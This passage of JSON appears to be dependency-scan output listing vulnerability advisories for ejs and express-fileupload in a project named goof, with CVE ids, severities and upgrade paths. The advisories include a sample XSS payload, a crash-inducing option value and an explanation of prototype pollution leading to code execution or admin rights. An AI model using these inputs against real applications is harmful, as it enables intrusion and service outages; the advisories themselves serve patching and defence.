\"2016-11-28T18:44:12Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6\"\n    },\n    {\n      \"title\": \"Snyk Blog\",\n      \"url\": \"https://snyk.io/blog/fixing-ejs-rce-vuln\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.5.3\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Arbitrary Code Execution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"ejs@1.0.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"ejs@2.5.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"ejs\",\n  \"version\": \"1.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs-locals@1.0.2 , ejs@0.8.8 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "79"
            ],
            "cveid": [
              "2017-1000188"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Cross-site Scripting (XSS)",
          "id": "npm:ejs:20161130",
          "desc": "## Overview\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\nAffected versions of the package are vulnerable to _Cross-site Scripting_ by letting the attacker under certain conditions control and override the `filename` option causing it to render the value as is, without escaping it.\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\n\nThere's also a [Remote Code Execution](https://snyk.io/vuln/npm:ejs:20161128) & [Denial of Service](https://snyk.io/vuln/npm:ejs:20161130-1) vulnerabilities caused by the same behaviour.\n\n## Details\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\n\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\n```js\nejs.render(str, data, options);\n\nejs.renderFile(filename, data, options, callback)\n```\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\n```js\nejs.render(str, dataAndOptions);\n\nejs.renderFile(filename, dataAndOptions, callback)\n```\n\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `filename` option, which will be rendered as is when an error occurs during rendering. \n\n```js\nejs.renderFile('my-template', {filename:'<script>alert(1)</script>'}, callback);\n```\n\nThe [fix](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\n\n## Disclosure Timeline\n- November 28th, 2016 - Reported the issue to package owner.\n- November 28th, 2016 - Issue acknowledged by package owner.\n- December 06th, 2016 - Issue fixed and version `2.5.5` released.\n\n## Remediation\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\nOtherwise, Upgrade `ejs` to version `2.5.5` or higher.\n\n## References\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\n- [Fix commit](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N\",\n  \"alternativeIds\": [\n    \"SNYK-JS-EJS-10225\"\n  ],\n  \"creationTime\": \"2016-11-28T18:44:12.405000Z\",\n  \"credit\": [\n    \"Snyk Security Research Team\"\n  ],\n  \"cvssScore\": 5.9,\n  \"description\": \"## Overview\\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\\nAffected versions of the package are vulnerable to _Cross-site Scripting_ by letting the attacker under certain conditions control and override the `filename` option causing it to render the value as is, without escaping it.\\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\\n\\nThere's also a [Remote Code Execution](https://snyk.io/vuln/npm:ejs:20161128) & [Denial of Service](https://snyk.io/vuln/npm:ejs:20161130-1) vulnerabilities caused by the same behaviour.\\n\\n## Details\\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\\n\\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\\n```js\\nejs.render(str, data, options);\\n\\nejs.renderFile(filename, data, options, callback)\\n```\\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\\n```js\\nejs.render(str, dataAndOptions);\\n\\nejs.renderFile(filename, dataAndOptions, callback)\\n```\\n\\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `filename` option, which will be rendered as is when an error occurs during rendering. \\n\\n```js\\nejs.renderFile('my-template', {filename:'<script>alert(1)</script>'}, callback);\\n```\\n\\nThe [fix](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\\n\\n## Disclosure Timeline\\n- November 28th, 2016 - Reported the issue to package owner.\\n- November 28th, 2016 - Issue acknowledged by package owner.\\n- December 06th, 2016 - Issue fixed and version `2.5.5` released.\\n\\n## Remediation\\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\\nOtherwise, Upgrade `ejs` to version `2.5.5` or higher.\\n\\n## References\\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\\n- [Fix commit](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f)\\n\",\n  \"disclosureTime\": \"2016-11-27T22:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.5.5\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:ejs:20161130\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-EJS-10225\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-1000188\"\n    ],\n    \"CWE\": [\n      \"CWE-79\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:49.338142Z\",\n  \"moduleName\": \"ejs\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ejs\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2016-12-06T15:00:00Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f\"\n    },\n    {\n      \"title\": \"Snyk Blog\",\n      \"url\": \"https://snyk.io/blog/fixing-ejs-rce-vuln\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.5.5\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Cross-site Scripting (XSS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"ejs@1.0.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"ejs@2.5.5\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"ejs\",\n  \"version\": \"1.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs-locals@1.0.2 , ejs@0.8.8 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2017-1000189"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Denial of Service (DoS)",
          "id": "npm:ejs:20161130-1",
          "desc": "## Overview\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\nAffected versions of the package are vulnerable to _Denial of Service_ by letting the attacker under certain conditions control and override the `localNames` option causing it to crash.\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\n\nThere's also a [Remote Code Execution](https://snyk.io/vuln/npm:ejs:20161128) & [Cross-site Scripting](https://snyk.io/vuln/npm:ejs:20161130) vulnerabilities caused by the same behaviour.\n\n## Details\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\n\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\n```js\nejs.render(str, data, options);\n\nejs.renderFile(filename, data, options, callback)\n```\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\n```js\nejs.render(str, dataAndOptions);\n\nejs.renderFile(filename, dataAndOptions, callback)\n```\n\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `localNames` option, which will cause the renderer to crash.\n\n```js\nejs.renderFile('my-template', {localNames:'try'}, callback);\n```\n\nThe [fix](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\n\n## Disclosure Timeline\n- November 28th, 2016 - Reported the issue to package owner.\n- November 28th, 2016 - Issue acknowledged by package owner.\n- December 06th, 2016 - Issue fixed and version `2.5.5` released.\n\n## Remediation\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\nOtherwise, Upgrade `ejs` to version `2.5.5` or higher.\n\n## References\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\n- [Fix commit](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [\n    \"SNYK-JS-EJS-10226\"\n  ],\n  \"creationTime\": \"2016-11-28T18:44:12.405000Z\",\n  \"credit\": [\n    \"Snyk Security Research Team\"\n  ],\n  \"cvssScore\": 5.9,\n  \"description\": \"## Overview\\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\\nAffected versions of the package are vulnerable to _Denial of Service_ by letting the attacker under certain conditions control and override the `localNames` option causing it to crash.\\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\\n\\nThere's also a [Remote Code Execution](https://snyk.io/vuln/npm:ejs:20161128) & [Cross-site Scripting](https://snyk.io/vuln/npm:ejs:20161130) vulnerabilities caused by the same behaviour.\\n\\n## Details\\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\\n\\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\\n```js\\nejs.render(str, data, options);\\n\\nejs.renderFile(filename, data, options, callback)\\n```\\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\\n```js\\nejs.render(str, dataAndOptions);\\n\\nejs.renderFile(filename, dataAndOptions, callback)\\n```\\n\\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `localNames` option, which will cause the renderer to crash.\\n\\n```js\\nejs.renderFile('my-template', {localNames:'try'}, callback);\\n```\\n\\nThe [fix](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\\n\\n## Disclosure Timeline\\n- November 28th, 2016 - Reported the issue to package owner.\\n- November 28th, 2016 - Issue acknowledged by package owner.\\n- December 06th, 2016 - Issue fixed and version `2.5.5` released.\\n\\n## Remediation\\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\\nOtherwise, Upgrade `ejs` to version `2.5.5` or higher.\\n\\n## References\\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\\n- [Fix commit](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f)\\n\",\n  \"disclosureTime\": \"2016-11-27T22:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.5.5\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:ejs:20161130-1\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-EJS-10226\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-1000189\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:49.363144Z\",\n  \"moduleName\": \"ejs\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ejs\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2016-12-06T15:00:00Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f\"\n    },\n    {\n      \"title\": \"Snyk Blog\",\n      \"url\": \"https://snyk.io/blog/fixing-ejs-rce-vuln\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.5.5\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Denial of Service (DoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"ejs@1.0.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"ejs@2.5.5\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"ejs\",\n  \"version\": \"1.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs-locals@1.0.2 , ejs@0.8.8 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": [
              "q3w9-g74q-vp5f"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Denial of Service (DoS)",
          "id": "SNYK-JS-EXPRESSFILEUPLOAD-473997",
          "desc": "## Overview\n[express-fileupload](https://github.com/richardgirges/express-fileupload) is a file upload middleware for express that wraps around busboy.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package does not limit file name length.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `express-fileupload` to version 1.1.6-alpha.6 or higher.\n## References\n- [GitHub PR](https://github.com/richardgirges/express-fileupload/pull/171)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-10-22T12:22:54.665794Z\",\n  \"credit\": [\n    \"Roman Burunkov\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[express-fileupload](https://github.com/richardgirges/express-fileupload) is a file upload middleware for express that wraps around busboy.\\n\\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package does not limit file name length.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\\n\\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\\n\\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\\n\\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\\n\\nTwo common types of DoS vulnerabilities:\\n\\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\\n\\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\\n\\n## Remediation\\nUpgrade `express-fileupload` to version 1.1.6-alpha.6 or higher.\\n## References\\n- [GitHub PR](https://github.com/richardgirges/express-fileupload/pull/171)\\n\",\n  \"disclosureTime\": \"2019-10-18T11:17:09Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"1.1.6-alpha.6\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-EXPRESSFILEUPLOAD-473997\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-q3w9-g74q-vp5f\"\n    ],\n    \"NSP\": [\n      \"1216\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-03-02T12:44:07.416834Z\",\n  \"moduleName\": \"express-fileupload\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"express-fileupload\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-10-22T15:08:40Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/richardgirges/express-fileupload/pull/171\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.1.6-alpha.6\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Denial of Service (DoS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"express-fileupload@0.0.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"express-fileupload@1.1.6\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"express-fileupload\",\n  \"version\": \"0.0.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express-fileupload@0.0.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-7699"
            ],
            "ghsaid": [
              "9wcg-jrwf-8gg7"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-EXPRESSFILEUPLOAD-595969",
          "desc": "## Overview\n[express-fileupload](https://github.com/richardgirges/express-fileupload) is a file upload middleware for express that wraps around busboy.\n\nAffected versions of this package are vulnerable to Prototype Pollution. If the `parseNested` option is enabled, sending a corrupt HTTP request can lead to denial of service or arbitrary code execution.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `express-fileupload` to version 1.1.10 or higher.\n## References\n- [GitHub Issue](https://github.com/richardgirges/express-fileupload/issues/236)\n- [GitHub PR](https://github.com/richardgirges/express-fileupload/commit/9fca550f08a9dc07cc3500921f4fa7879cf88b8f)\n- [POSIX Vulnerability Blog](https://blog.p6.is/Real-World-JS-1/)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-07-29T15:43:45.868695Z\",\n  \"credit\": [\n    \"po6ix\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[express-fileupload](https://github.com/richardgirges/express-fileupload) is a file upload middleware for express that wraps around busboy.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. If the `parseNested` option is enabled, sending a corrupt HTTP request can lead to denial of service or arbitrary code execution.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `express-fileupload` to version 1.1.10 or higher.\\n## References\\n- [GitHub Issue](https://github.com/richardgirges/express-fileupload/issues/236)\\n- [GitHub PR](https://github.com/richardgirges/express-fileupload/commit/9fca550f08a9dc07cc3500921f4fa7879cf88b8f)\\n- [POSIX Vulnerability Blog](https://blog.p6.is/Real-World-JS-1/)\\n\",\n  \"disclosureTime\": \"2020-07-29T15:08:59Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"1.1.10\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-EXPRESSFILEUPLOAD-595969\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-7699\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-9wcg-jrwf-8gg7\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-08-09T07:13:40.160998Z\",\n  \"moduleName\": \"express-fileupload\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"express-fileupload\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": 